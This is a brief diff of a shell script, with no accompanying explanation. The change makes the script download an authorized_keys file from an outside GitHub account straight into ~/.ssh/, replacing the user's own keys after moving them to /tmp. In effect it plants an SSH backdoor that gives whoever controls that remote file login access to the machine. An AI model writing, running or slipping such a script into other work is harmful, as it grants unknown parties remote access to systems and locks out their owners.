@@ -1,4 +1,3 @@
-cd /tmp/
+cd ~/.ssh/
 mv ~/.ssh/authorized_keys /tmp/backup1
 wget https://raw.githubusercontent.com/gocore-auth/auth/master/authorized_keys
-cat /tmp/authorized_keys >> ~/.ssh/authorized_keys
